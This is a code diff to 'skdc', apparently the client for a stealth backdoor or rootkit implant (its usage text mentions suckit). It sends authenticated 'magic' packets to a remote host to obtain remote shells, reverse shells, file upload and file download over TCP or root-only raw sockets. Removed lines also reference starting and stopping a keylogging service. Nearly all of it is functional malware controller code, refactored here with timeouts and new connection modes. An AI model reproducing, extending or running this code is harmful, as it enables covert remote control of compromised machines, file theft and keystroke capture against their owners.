@@ -12,50 +12,70 @@
 #include <stdlib.h>
 #include <termios.h>
 #include <sys/ioctl.h>
+#include <sys/wait.h>
 
 #include "raw.h"
 #include "config.h"
-#include "actions.h"
+#include "common.h"
 #include "sha1.h"
 
 struct rawsock r;
-int swapd_pid, rawd_pid;
+//int swapd_pid, rawd_pid;
 int winchange = 1;
 unsigned char clientauth[20], serverauth[20];
 //rc4_ctx skd_crypt, skd_decrypt;
 
 // Per la redimesio de finestra
-void winch(int i) {
-    signal(SIGWINCH, winch);
+void sig_winch(int i) {
+    signal(SIGWINCH, sig_winch);
     winchange = 1;
 }
+
+/*void sig_child(int n) {
+    signal(SIGCHLD, sig_child);
+    waitpid(-1, NULL, WNOHANG);
+}*/
+
+/*
+ * We could implement all the combinations, but these are the best.
+ *
+ * Direct shell (tcp socket in client, tcp socket in server):
+ * This mode bind a tcp port on the server and starts listening for new connections. This mode is for unprivileged 
+ * user only, and let us to use the client also as a unprivileged user.
+ * The workflow is:
+ *  ./client -a shell -h host -d port 
+ *
+ * Direct shell using full RAW connection (raw socket in client, raw socket in server):
+ *  ./client -a shell -h host -d port -l port
+ *
+ * Reverse shell (tcp socket in client, raw socket in server):
+ *  ./client -a shell -h host -d port -l port
+ *
+ */
+
 
 int usage(char *s) {
     printf("skdc - <whats[@t]wekk.net>\n"
            "==========================\n"
         "Usage:\n"
-        "%s -a {action} -t {connection type} [-s {service}] -h ip/hostname -l local_port -d dest_port [-f file] [-r]\n"
+        "%s -a {shell|down|up|check|listen|socks4a} -c {tcp|raw|rev} -h ip/hostname -l local_port -d dest_port [-f file] [-t secs]\n"
         "   -a: action to execute\n"
         "      * shell => launches a shell (-hd required)\n"
         "      * down => download a file (-hdf required)\n"
         "      * up => uploads a file (-hdf required)\n"
-        "      * check => check if skd is running on remote host (-hd required)\n"
-        "      * listen => listens for a tty (-l required)\n"
-        "      * socks => starts a socks daemon\n"
-        "      * start => starts a service\n"
-        "      * stop => stops a service\n"
-        "   -t: connection type for: shell|up|down\n"
-        "      * raw => use own raw protocol (stealth, but low performance)\n"
-        "      * tcp => use direct tcp connection\n"
-        "      * rtcp => use a reverse tcp connection\n"
-        "   -s: service to start or stop\n"
-        "      * keylog => the keylogging daemon\n"
-        "   -h: host or ip address\n"
-        "   -l: local port to listen (enables reverse mode and disables raw mode)\n"
-        "   -d: destination port to send magic\n"
+        "      * TODO:check => check if suckit is running on remote host (-hd required)\n"
+        "      * TODO:socks4a => opens a socks server in the client that forward the traffic through the server\n"
+		"   -c: connection type\n"
+        "      * tcp => a direct tcp connection to the server\n"
+        "      * rev => ask for a reverse connection (-hld required)\n"
+        "      * raw => raw connection (only transfer small files) (-ld required)\n"
+        "      * listen => listen for a tty connection (-l required)\n"
+		"   -h: host or ip address\n"
+		"   -l: local port to listen (enables reverse mode and disables raw mode)\n"
+		"   -d: destination port to send magic\n"
         "   -f: file to upload or download\n"
         ,s);
-    return -1;
+	return -1;
 }
 
 
@@ -64,15 +84,23 @@ int client_shell(int rsock, int wsock) {
     struct termios oldterm, newterm; 
     char buf[BUFSIZE];
     struct  winsize ws;
+	struct timeval tv;
+	int nfd = 0;
 
-    signal(SIGWINCH, winch);
+    signal(SIGWINCH, sig_winch);
 
     // Terminal setup
     tcgetattr(0, &oldterm);
     newterm = oldterm;
     newterm.c_lflag &= ~(ICANON | ECHO | ISIG);
     newterm.c_iflag &= ~(IXON | IXOFF);
+	errno = 0;
     tcsetattr(0, TCSAFLUSH, &newterm);
+	if ( errno != 0 ) tcsetattr(0, TCSAFLUSH, &newterm);
+
+	// Timeout
+	tv.tv_sec=TIMEOUT/3;
+	tv.tv_usec=0;
 
     while (1) {
         fd_set  fds;
@@ -84,7 +112,7 @@ int client_shell(int rsock, int wsock) {
         if (winchange) {
             if (ioctl(1, TIOCGWINSZ, &ws) == 0) {
                 unsigned char buffer[5];
-                buffer[0] = WCHAR;
+                buffer[0] = ECHAR;
                 buffer[1] = (ws.ws_col >> 8) & 0xFF;
                 buffer[2] = ws.ws_col & 0xFF;
                 buffer[3] = (ws.ws_row >> 8) & 0xFF;
@@ -96,22 +124,34 @@ int client_shell(int rsock, int wsock) {
         }
 
         errno = 0;
-        if (select(rsock + 1, &fds, NULL, NULL, NULL) < 0 && (errno != EINTR)) break;
+        nfd = select(rsock + 1, &fds, NULL, NULL, &tv);
+        if (nfd < 0 && (errno != EINTR)) break;
+		// if timeout
+		else if (nfd == 0) {
+			tv.tv_sec=TIMEOUT/3;
+		    tv.tv_usec=0;
+			unsigned char buffer[5];
+			memset(buffer, 0, 5);
+            buffer[0] = ECHAR;
+            write(wsock, buffer, 5);
+		}
+		else {
+        	/* stdin => server */
+        	if (FD_ISSET(0, &fds)) {
+        	    int count = read(0, buf, BUFSIZE);
+        	    if (count <= 0 && (errno != EINTR)) break;
+        	    if (write(wsock, buf, count) <= 0 && (errno != EINTR)) break;
+        	    if (memchr(buf, ECHAR, count)) break;
+        	}
 
-        /* stdin => shell */
-        if (FD_ISSET(0, &fds)) {
-            int count = read(0, buf, BUFSIZE);
-            if (count <= 0 && (errno != EINTR)) break;
-            if (write(wsock, buf, count) <= 0 && (errno != EINTR)) break;
-            if (memchr(buf, ECHAR, count)) break;
-        }
-
-        /* shell => stdout */
-        if (FD_ISSET(rsock, &fds)) {
-            int count = read(rsock, buf, BUFSIZE);
-            if (count <= 0 && (errno != EINTR)) break;
-            if (write(1, buf, count) <= 0 && (errno != EINTR)) break;
-        }
+        	/* server => stdout */
+        	if (FD_ISSET(rsock, &fds)) {
+        	    int count = read(rsock, buf, BUFSIZE);
+        	    if (count <= 0 && (errno != EINTR)) break;
+        	    if (memchr(buf, ECHAR, count)) break; // to let server kill client
+        	    if (write(1, buf, count) <= 0 && (errno != EINTR)) break;
+        	}
+		}
     }
 
     perror("Connection disappeared");
@@ -119,7 +159,7 @@ int client_shell(int rsock, int wsock) {
     close(rsock);
     close(wsock);
 
-    return 0;
+	return 0;
 }
 
 int client_upload(int sock, char *file) {
@@ -135,15 +175,16 @@ int client_upload(int sock, char *file) {
         bytes = 0;
         transfered = 0;
         printf("Size: %lu bytes\n", size);
-        while ((bytes = read(fd, &buf, BUFSIZE)) > 0) {
-            if ((transfered += write(sock, &buf, bytes)) < bytes) {
+        while ((bytes = read(fd, buf, BUFSIZE)) > 0) {
+            if ((transfered += write(sock, buf, bytes)) < bytes) {
                 printf("ERROR AL LLEGIR!\n");
             } else  {
-                printf("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bUploaded: %lu%%", (transfered/(1+(size/100))));
+                printf("\rUploaded: %lu%%", (transfered/(1+(size/100))));
             }
         }
-        printf("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bUploaded: 100%%\n");
+        printf("\rUploaded: 100%%\n");
         printf("Fitxer %s enviat!\n", file);
+        sleep(2);
     }
 
     return 0;
@@ -153,6 +194,14 @@ int client_download(int sock, char *file) {
     int fd, bytes;
     char buf[BUFSIZE];
     char *ptr = strrchr(file, '/');
+    struct timeval tv;
+    int nfd = 0;
+    fd_set  fds;
+
+    // Timeout
+    tv.tv_sec=15;
+    tv.tv_usec=0;
+
     if (ptr) { ptr++; }
     else { ptr = file; }
 
@@ -160,9 +209,19 @@ int client_download(int sock, char *file) {
         perror("open");
     } else {
         bytes = 0;
-        while ((bytes = read(sock, &buf, BUFSIZE)) > 0) {
-            if (write(fd, &buf, bytes) < bytes) {
-                printf("ERROR AL LLEGIR!\n");
+        while (1) {
+            FD_ZERO(&fds);
+            FD_SET(sock, &fds);
+
+            nfd = select(sock + 1, &fds, NULL, NULL, &tv);
+            if (nfd == 0) break;
+            else if (nfd > 0) {                           
+                bytes = read(sock, buf, BUFSIZE);
+                if (bytes > 0) {
+                    if (write(fd, buf, bytes) < bytes) {
+                    printf("ERROR AL LLEGIR!\n");
+                    }
+                }
             }
         }
         printf("Fitxer %s guardat!\n", ptr);
@@ -171,38 +230,29 @@ int client_download(int sock, char *file) {
     return 0;
 }
 
-int client_socks(int sockr) {
-    return 0;
-}
-
-void do_action(int action, int sock, char *file) {
+void do_action(int action, int sockr, int sockw, char *file) {
     switch(action) {
         case UPLOAD:
-        case RUPLOAD:
+        case REVUPLOAD:
             printf("Uploading file\n");
-            client_upload(sock, file);
+            client_upload(sockw, file);
             break;
         case DOWNLOAD:
-        case RDOWNLOAD:
+        case REVDOWNLOAD:
             printf("Downloading file\n");
-            client_download(sock, file);
+            client_download(sockr, file);
             break;
         case SHELL:
-        case RSHELL:
+        case REVSHELL:
         case LISTEN:
             printf("Launching shell (scape character is ^K) \n");
-            client_shell(sock, sock);
-            break;
-        case SOCKS:
-        case RSOCKS:
-            printf("Launching socks server\n");
-            client_socks(sock);
+            client_shell(sockr, sockw);
             break;
         default:
             printf("Invalid option: %d\n", action);
     }
 }
-
+/*
 unsigned long resolve(const char *host) {
     struct hostent *he;
     struct sockaddr_in si;
@@ -213,16 +263,16 @@ unsigned long resolve(const char *host) {
     }
     memcpy((char *) &si.sin_addr, (char *) he->h_addr, sizeof(si.sin_addr));
     return si.sin_addr.s_addr;
-}
+}*/
 
-void start_daemon(int action, int port, char *file) {
+void start_daemon(int action, int port, char *file, int pid) {
     int sock_listen, sock_con;
     struct sockaddr_in srv;
     struct sockaddr_in cli;
     unsigned int slen = sizeof(cli);
     int one = 1;
 
-    if (!fork()) return;
+    //if (!fork()) return;
     
     sock_listen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock_listen < 0) {
@@ -251,56 +301,20 @@ void start_daemon(int action, int port, char *file) {
 
     printf("Listening to port %d\n", port);
 
+	errno = 0;
     sock_con = accept(sock_listen, (struct sockaddr *) &cli, &slen);
     close(sock_listen);
+    if (pid != 0) kill(pid, SIGTERM);
+
     if (sock_con < 0) {
-        perror("accept");
         exit(-1);
     }
 
-    printf("Received connection!\n");
+    printf("\nReceived connection!\n");
 
-    do_action(action, sock_con, file);
+    do_action(action, sock_con, sock_con, file);
 
     exit(0);
-}
-
-int raw_daemon() {
-    int pid = fork();
-    if (pid) return pid;
-
-    int sock;
-    struct sockaddr_in raw;
-    unsigned int slen = sizeof(raw);
-    struct packet p;
-    int size;
-
-    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (sock < 0) {
-        printf("Can't allocate raw socket\n");
-        exit(-1);
-    }
-
-    // TODO: evaluar si és millor un sniffer (mode promiscuo) o això (CPU)
-    while (1) {
-        size = recvfrom(sock, &p, sizeof(p), 0, (struct sockaddr *) &raw, &slen);
-        //        debug("Rebut: %d bytes port %d - %d\n", size, ntohs(p.tcp.dest), ntohs(p.tcp.source));
-        //    if (ntohs(p.tcp.dest) == 2222) {
-        //        debug("Rebut: %d bytes ports %d -> %d\n", size, ntohs(p.tcp.source), 2222);
-        //    }
-        // Si el tamany del paquet es el que toca
-        if (size == sizeof(struct packet)) {
-            // I el password és correcte
-            if (!memcmp(serverauth, p.action.pass, 20)) {
-                //printf("S'ha rebut el paquet d'autenticacio correctament (action: %d)\n", p.action.action);
-                //If has the RESET flag, is a direct raw packet
-                if (p.tcp.rst) {
-                    //printf("packet de sessio RAW (%d bytes)\n", p.action.size);
-                    fill_raw_connection(&r, p.action.bytes, p.action.size);
-                }
-            }
-        }
-    }
 }
 
 void get_pass() {
@@ -329,76 +343,172 @@ void get_pass() {
     }
 }
 
-int send_magicpk(struct data *d, unsigned long ip, int local_port, int dest_port, int connection) {
-    struct sockaddr_in cli;
-    struct in_addr in;
-    in.s_addr = ip;
+void raw_action(int action, short local_port, char *host, short dest_port, char *file) {
+    int rawd_pid = 0;
+    unsigned long ip;
+    if (!getuid()) {
 
+	    // Check hostname
+	    ip = resolve(host, NULL);
+        if (ip == INADDR_NONE) {
+            perror("host");
+            exit(-1);
+        }
+
+        pipe(r.r);
+        pipe(r.w);
+		r.sport = local_port;
+		r.dport = dest_port;
+        r.host = ip;
+
+        rawd_pid = start_rawsock_clientd(&r);
+		sleep(1);
+
+		// action = SHELL
+        send_rawsock_action(&r, action, file);
+
+        do_action(action, r.r[0], r.w[1], file);
+		stop_rawsock_partner(&r, clientauth);
+        kill(rawd_pid, 15);
+    } else {
+        printf("You need root acces for the raw mode\n");
+    }
+}
+
+void listen_action(short local_port) {
+    //TODO: for now, we always spawn a shell
+    start_daemon(SHELL, local_port, NULL, 0);
+}
+
+void tcp_action(int action, short local_port, char *host, short dest_port, char *file) {
+    struct data cmdpkt;
+    struct sockaddr_in cli;
+    unsigned long ip;
+
+    // TODO: retry several times 
     // Connect to skd
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
         perror("socket");
-        return 0;
+        exit(-1);
+    }
+    
+	// Check hostname
+	ip = resolve(host, NULL);
+    if (ip == INADDR_NONE) {
+        perror("host");
+        exit(-1);
     }
 
     memset(&cli, 0, sizeof(cli));
     cli.sin_family = AF_INET;
     cli.sin_port = htons(dest_port);
     cli.sin_addr.s_addr = ip;
+
     if (connect(sock, (struct sockaddr *) &cli, sizeof(cli)) < 0 ) {
-       printf("Can't connect to %s:%d (port closed?)\n", inet_ntoa(in), dest_port);
-       if (!connection) {
-           printf("If the "PROCNAME" is launched as root we can also use a closed port\n");
-           printf("Sending raw packet...\n");            
-           if (!getuid()) {
-               // Send the action
-               send_raw(ip, local_port, dest_port, (unsigned char *)&d, sizeof(struct data), 0);
-           } else {
-               printf("You have to be root to send the raw packet!\n");    
-           }
-        }
-        return 0;
+        perror("connect");
+        exit(-1);
+    }
+
+    // Generate packet
+    memcpy(cmdpkt.pass, clientauth, 20);
+    cmdpkt.port = local_port;
+    cmdpkt.action = action;
+	if (file) memcpy(cmdpkt.bytes, file, strlen(file));
+
+    // Send packet
+    write(sock, &cmdpkt, sizeof(cmdpkt));
+    do_action(action, sock, sock, file);
+    close(sock);    
+}
+
+int reverse_action(int action, short local_port, char *host, short dest_port, char *file) {
+    struct data cmdpkt;
+    struct sockaddr_in cli;
+    unsigned long ip;
+    int pid;
+	// Launch daemon if is a reverse command
+    switch (action) {
+        case UPLOAD: action = REVUPLOAD; break;
+        case DOWNLOAD: action = REVDOWNLOAD; break;
+        case SHELL: action = REVSHELL; break;
+    }
+
+    if ((pid = fork()) > 0) {
+    	// Launch daemon and wait
+        start_daemon(action, local_port, file, pid);
     } else {
-        // Send packet
-        write(sock, d, sizeof(struct data));
-        return sock;
+		sleep(1);
+        printf("Sending magic");fflush(stdout);
+        while (1) {
+            // Wait some time
+            sleep(2);
+            printf(".");fflush(stdout);
+            // Connect to skd
+            int sock = socket(AF_INET, SOCK_STREAM, 0);
+            if (sock < 0) {
+                perror("socket");
+                continue;
+            }
+            
+	        // Check hostname
+	        ip = resolve(host, NULL);
+            if (ip == INADDR_NONE) {
+                perror("host");
+                continue;
+            }
+
+            memset(&cli, 0, sizeof(cli));
+            cli.sin_family = AF_INET;
+            cli.sin_port = htons(dest_port);
+            cli.sin_addr.s_addr = ip;
+            if (connect(sock, (struct sockaddr *) &cli, sizeof(cli)) < 0 ) {
+                perror("connect");
+                continue;
+            }
+
+            // Generate packet
+            memcpy(cmdpkt.pass, clientauth, 20);
+            cmdpkt.port = local_port;
+            cmdpkt.action = action;
+			if (file) {
+				memset(cmdpkt.bytes, 0, sizeof(cmdpkt.bytes));
+				memcpy(cmdpkt.bytes, file, strlen(file));
+			}
+
+            // Send packet
+            write(sock, &cmdpkt, sizeof(cmdpkt));
+            close(sock);
+        }
     }
     return 0;
-
 }
 
 int main(int argc, char *argv[]) {
-    int opt, local_port = -1, dest_port = -1, action = -1, type = -1, service = -1, sock;
-    char *host = 0, *cmd, *file = 0;
-    unsigned long ip;
-    struct data cmdpkt;
+	int opt, local_port = -1, dest_port = -1, action = -1, con_type = -1;
+	char *host = 0, *cmd, *file = 0;
 
-    // Read params
-    while ((opt = getopt(argc, argv, "a:h:l:d:f:t:s:") ) != EOF) {
+	// Read params
+	while ((opt = getopt(argc, argv, "a:c:h:l:d:f:t:") ) != EOF) {
         switch (opt) {
             case 'a':
                 cmd = optarg;
                 if (!strncmp(cmd, "shell", 5)) action = SHELL;
                 else if (!strncmp(cmd, "down", 4)) action = DOWNLOAD;
-                else if (!strncmp(cmd, "listen", 6)) {action = LISTEN; type = RTCP;}
+                else if (!strncmp(cmd, "listen", 6)) action = LISTEN;
                 else if (!strncmp(cmd, "up", 2)) action = UPLOAD;
                 else if (!strncmp(cmd, "check", 5)) action = CHECK;
-                else if (!strncmp(cmd, "socks", 5)) action = SOCKS;
-                else if (!strncmp(cmd, "start", 5)) action = START;
-                else if (!strncmp(cmd, "stop", 4)) action = STOP;
                 break;
-            case 't':
-                if (!strncmp(optarg, "raw", 3)) type = RAW;
-                else if (!strncmp(optarg, "tcp", 3)) type = TCP;
-                else if (!strncmp(optarg, "rtcp", 4)) type = RTCP;
-                break;
-            case 's':
-                if (!strncmp(optarg, "keylog", 6)) service = KEYLOG;
-                else if (!strncmp(optarg, "socks", 5)) service = SOCKS;
+            case 'c':
+                cmd = optarg;
+                if (!strncmp(cmd, "tcp", 3)) con_type = CON_TCP;
+                else if (!strncmp(cmd, "rev", 3)) con_type = CON_REV;
+                else if (!strncmp(cmd, "raw", 3)) con_type = CON_RAW;
+                else if (!strncmp(cmd, "listen", 6)) con_type = LISTEN;
                 break;
             case 'h':
-                host = optarg;
-                break;
+				host = optarg;
+				break;
             case 'l':
                 if (sscanf(optarg, "%u\n", &local_port) != 1)
                     return usage(argv[0]);
@@ -415,118 +525,43 @@ int main(int argc, char *argv[]) {
                 return -1;
         }
     }
-    // Check the parameters dependences
-    if ((local_port > 65535) || (dest_port  > 65535) ||  
-        ((action == SHELL)    && ((!host) || (type == -1) || (dest_port == -1))) ||
-        ((action == UPLOAD)   && ((!host) || (type == -1) || (dest_port == -1)   || (!file))) ||
-        ((action == DOWNLOAD) && ((!host) || (type == -1) || (dest_port == -1)   || (!file))) ||
-        ((action == CHECK)    && ((!host) || (dest_port == -1))) ||
-        ((action == LISTEN)   && ((local_port == -1) || type != RTCP)) || 
-        (action == -1) ||
-        (((action == START) || (action == STOP)) && ((service == -1))) ||
-        (((action == START) || (action == STOP)) && (type != -1)) ||
-        ((type == RTCP) && (local_port == -1))  
-        ) {
-            return usage(argv[0]);
-    }
 
-    // Transform service action
-    if (action == START) {
-        switch (service) {
-            case KEYLOG: action = SKEYLOG; break;
-        }
-    } else if (action == STOP) {
-        switch (service) {
-            case KEYLOG: action = KKEYLOG; break;
-        }
-    } else if (type == RTCP) {
-        switch (action) {
-            case UPLOAD: action = RUPLOAD; break;
-            case DOWNLOAD: action = RDOWNLOAD; break;
-            case SHELL: action = RSHELL; break;
-            case SOCKS: action = RSOCKS; break;
-        }
-    }
+	// Check the parameters dependences
+	if ((local_port > 65535) || (dest_port  > 65535) ||  
+        ((con_type == CON_TCP && ((!host) || (dest_port == -1)))) ||
+        ((con_type == CON_REV && ((!host) || (dest_port == -1) || (local_port == -1) ))) ||
+        ((con_type == CON_RAW && ((!host) || (dest_port == -1) || (local_port == -1) ))) ||
+        ((con_type == LISTEN && (local_port == -1))) ||
+        ((action == UPLOAD || action == DOWNLOAD) && (!file)) ||
+//		((action == SHELL)    && ((!host) || (dest_port == -1))) ||
+//		((action == UPLOAD)   && ((!host) || (dest_port == -1)   || (!file))) ||
+//		((action == DOWNLOAD) && ((!host) || (dest_port == -1)   || (!file))) ||
+//		((action == CHECK)    && ((!host) || (dest_port == -1))) ||
+//		(local_port == -1 && con_type != CON_TCP) || (action == -1) ||
+//      ((con_type == LISTEN && local_port == -1) ||
+		(con_type == -1) || (action == -1)
+		)  {
+			return usage(argv[0]);
+	}
 
     get_pass();
+    sig_child(0);
 
-    // Generate packet
-    memcpy(cmdpkt.pass, clientauth, 20);
-    cmdpkt.port = local_port;
-    cmdpkt.action = action;
-    cmdpkt.size = strlen(file);
-    memcpy(cmdpkt.bytes, file, strlen(file));
+	// Launch selected action
+	switch (con_type) {
+		case CON_TCP:
+			tcp_action(action, local_port, host, dest_port, file);
+			break;
+		case CON_REV:
+			reverse_action(action, local_port, host, dest_port, file);
+			break;
+		case CON_RAW:
+			raw_action(action, local_port, host, dest_port, file);
+			break;
+		case LISTEN:
+			listen_action(local_port);
+			break;
+	}
 
-    // If the action doesn't produce a connection
-    if (action == SKEYLOG || action == KKEYLOG) {
-        // Check hostname
-        ip = resolve(host);
-        if (ip == INADDR_NONE) {
-            perror("host");
-            return -1;
-        }
-        send_magicpk(&cmdpkt, ip, 80, dest_port, 0);
-        return 0;
-    }
-
-    switch(type) {
-        case RTCP:
-            // Launch daemon and wait
-            start_daemon(action, local_port, file);
-            // Wait some time
-            sleep(2);
-
-            // TODO: retry several times 
-            if (action != LISTEN) {
-                // Check hostname
-                ip = resolve(host);
-                if (ip == INADDR_NONE) {
-                    perror("host");
-                    return -1;
-                }
-                send_magicpk(&cmdpkt, ip, local_port, dest_port, 0);
-            }
-            break;
-        case TCP:
-            // Check hostname
-            ip = resolve(host);
-            if (ip == INADDR_NONE) {
-                perror("host");
-                return -1;
-            }
-            if ((sock = send_magicpk(&cmdpkt, ip, local_port, dest_port, 1)) > 0) {
-                do_action(action, sock, file);
-            }
-            break;
-        case RAW:
-            if (!getuid()) {
-                pipe(r.r);
-                pipe(r.w);
-                r.initialized = 1;
-                rawd_pid = raw_daemon();
-                // Check hostname
-                ip = resolve(host);
-                //ip = resolve(host, ipname);
-                if (ip == INADDR_NONE) {
-                    perror("host");
-                    return -1;
-                }
-    
-                swapd_pid = swapd_raw(&r, ip, local_port, dest_port, clientauth);
-
-                // Initialize the rawsocks structure
-                send_raw(ip, local_port, dest_port, (unsigned char *)&cmdpkt, sizeof(struct data), 1);
-                // Send the action
-                send_raw(ip, local_port, dest_port, (unsigned char *)&cmdpkt, sizeof(struct data), 0);
-
-                client_shell(r.r[0], r.w[1]);
-                kill(rawd_pid, 15);
-                kill(swapd_pid, 15);
-            } else {
-                printf("You need root acces for the raw mode\n");
-            }
-            break;
-    }
-
-    return 0;
+	return 0;
 }
